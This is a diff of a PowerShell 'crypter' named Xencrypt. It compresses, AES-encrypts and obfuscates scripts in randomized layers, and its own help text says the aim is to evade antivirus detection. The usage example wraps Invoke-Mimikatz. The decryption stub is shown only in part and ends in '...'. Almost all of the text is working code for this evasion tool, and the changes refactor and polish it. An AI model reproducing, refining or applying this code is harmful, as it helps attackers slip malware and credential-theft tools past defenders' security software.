@@ -19,7 +19,7 @@ $ErrorActionPreference = "Stop"
 $PSDefaultParameterValues['*:ErrorAction'] = 'Stop'
 
 function Create-Var {
-    # Generates a random variable name of varying lengths to increase obfuscation.
+    # Generates a random variable name with a length of 4 to 9 characters for better obfuscation.
     $charset = "abcdefghijkmnopqrstuvwxyz"
     (1..(4 + (Get-Random -Maximum 6)) | ForEach-Object { $charset[(Get-Random -Minimum 0 -Maximum $charset.Length)] }) -join ''
 }
@@ -30,17 +30,17 @@ function Invoke-Xencrypt {
     Obfuscates and encrypts a PowerShell script to evade antivirus detection.
 
     .DESCRIPTION
-    Invoke-Xencrypt takes any PowerShell script as input and performs packing and encryption to make it harder for antivirus (AV) tools to detect. 
-    You can recursively layer this obfuscation multiple times to bypass dynamic and heuristic detection methods.
+    Invoke-Xencrypt takes a PowerShell script as input and applies compression, encryption, 
+    and obfuscation to make it harder for antivirus (AV) solutions to detect and analyze.
 
     .PARAMETER InFile
-    Specifies the input PowerShell script to obfuscate and encrypt.
+    Specifies the path to the input PowerShell script to obfuscate and encrypt.
 
     .PARAMETER OutFile
-    Specifies the file where the obfuscated and encrypted script will be saved.
+    Specifies the path to save the obfuscated and encrypted script.
 
     .PARAMETER Iterations
-    Defines how many layers of packing and encryption will be applied. The default is 2 iterations.
+    Defines the number of encryption and obfuscation layers to apply. Default is 2.
 
     .EXAMPLE
     PS> Invoke-Xencrypt -InFile Invoke-Mimikatz.ps1 -OutFile obfuscated.ps1 -Iterations 3
@@ -51,93 +51,90 @@ function Invoke-Xencrypt {
 
     [CmdletBinding()]
     param (
-        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
+        [Parameter(Mandatory, Position = 0, ValueFromPipelineByPropertyName)]
         [string]$InFile = $(Throw "-InFile is required"),
-        
-        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
+
+        [Parameter(Mandatory, Position = 1, ValueFromPipelineByPropertyName)]
         [string]$OutFile = $(Throw "-OutFile is required"),
-        
-        [Parameter(Mandatory = $false, ValueFromPipeline, ValueFromPipelineByPropertyName)]
+
+        [Parameter(Mandatory = $false, Position = 2, ValueFromPipelineByPropertyName)]
         [int]$Iterations = 2
     )
 
     process {
+        # Display script banner
         Write-Output @"
 Xencrypt - PowerShell Crypter
 Copyright (C) 2020 Xentropy ( @SamuelAnttila )
-This software is distributed under the GNU General Public License.
+Distributed under the GNU General Public License.
 "@
 
-        # Read the input script
-        Write-Output "[*] Reading '$InFile' ..."
+        # Validate input file
+        Write-Output "[*] Validating input file..."
         if (-not (Test-Path $InFile)) {
             Throw "Error: Input file '$InFile' not found."
         }
         $codeBytes = [System.IO.File]::ReadAllBytes($InFile)
 
+        # Iteratively apply encryption and obfuscation
         for ($i = 1; $i -le $Iterations; $i++) {
-            Write-Output "[*] Starting encryption layer $i..."
+            Write-Output "[*] Applying encryption layer $i..."
 
-            # Randomly select encryption parameters
+            # Select random parameters for obfuscation
             $paddingModes = 'PKCS7', 'ISO10126', 'ANSIX923', 'Zeros'
-            $paddingMode = $paddingModes | Get-Random
-
             $cipherModes = 'ECB', 'CBC'
-            $cipherMode = $cipherModes | Get-Random
-
             $keySizes = 128, 192, 256
-            $keySize = $keySizes | Get-Random
-
             $compressionTypes = 'Gzip', 'Deflate'
+
+            $paddingMode = $paddingModes | Get-Random
+            $cipherMode = $cipherModes | Get-Random
+            $keySize = $keySizes | Get-Random
             $compressionType = $compressionTypes | Get-Random
 
             # Compress the script
-            Write-Output "[*] Compressing the script using $compressionType..."
+            Write-Output "[*] Compressing script using $compressionType..."
             $outputStream = New-Object System.IO.MemoryStream
-            if ($compressionType -eq "Gzip") {
-                $compressionStream = New-Object System.IO.Compression.GzipStream($outputStream, [IO.Compression.CompressionMode]::Compress)
-            } elseif ($compressionType -eq "Deflate") {
-                $compressionStream = New-Object System.IO.Compression.DeflateStream($outputStream, [IO.Compression.CompressionMode]::Compress)
+            switch ($compressionType) {
+                "Gzip"    { $compressionStream = New-Object System.IO.Compression.GzipStream($outputStream, [IO.Compression.CompressionMode]::Compress) }
+                "Deflate" { $compressionStream = New-Object System.IO.Compression.DeflateStream($outputStream, [IO.Compression.CompressionMode]::Compress) }
             }
             $compressionStream.Write($codeBytes, 0, $codeBytes.Length)
             $compressionStream.Close()
             $compressedBytes = $outputStream.ToArray()
 
-            # Generate encryption key
+            # Generate encryption key and IV
             Write-Output "[*] Generating encryption key and IV..."
-            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
-            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::$cipherMode
-            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::$paddingMode
-            $aesManaged.KeySize = $keySize
-            $aesManaged.GenerateKey()
-            $aesManaged.GenerateIV()
-
-            $encryptionKey = [System.Convert]::ToBase64String($aesManaged.Key)
+            $aes = New-Object System.Security.Cryptography.AesManaged
+            $aes.Mode = [System.Security.Cryptography.CipherMode]::$cipherMode
+            $aes.Padding = [System.Security.Cryptography.PaddingMode]::$paddingMode
+            $aes.KeySize = $keySize
+            $aes.GenerateKey()
+            $aes.GenerateIV()
 
             # Encrypt the compressed script
-            Write-Output "[*] Encrypting the script..."
-            $encryptor = $aesManaged.CreateEncryptor()
+            Write-Output "[*] Encrypting compressed script..."
+            $encryptor = $aes.CreateEncryptor()
             $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length)
-            $finalData = $aesManaged.IV + $encryptedData
-            $aesManaged.Dispose()
-
+            $finalData = $aes.IV + $encryptedData
             $encodedScript = [System.Convert]::ToBase64String($finalData)
 
-            # Randomize script construction
-            Write-Output "[*] Obfuscating and finalizing code layer..."
+            # Obfuscate the script
+            Write-Output "[*] Obfuscating script layer $i..."
             $stubTemplate = @'
-# Obfuscated and encrypted layer
+# Obfuscated script layer
 ${0} = [System.Convert]::FromBase64String("{1}")
 ${2} = [System.Convert]::FromBase64String("{3}")
 ...
 '@
-            $script = $stubTemplate -f $encodedScript, $encryptionKey, (Create-Var), (Create-Var)
+            $script = $stubTemplate -f (Create-Var), $encodedScript, (Create-Var), [System.Convert]::ToBase64String($aes.Key)
             $codeBytes = [System.Text.Encoding]::UTF8.GetBytes($script)
+            $aes.Dispose()
         }
 
-        # Write the final obfuscated script to the output file
-        Write-Output "[*] Writing the obfuscated script to '$OutFile'..."
+        # Save the final obfuscated script
+        Write-Output "[*] Writing final obfuscated script to '$OutFile'..."
         [System.IO.File]::WriteAllText($OutFile, [System.Text.Encoding]::UTF8.GetString($codeBytes))
-        Write-Output "[+] Obfuscation and encryption completed!"
+
+        Write-Output "[+] Obfuscation and encryption completed successfully!"
     }
 }
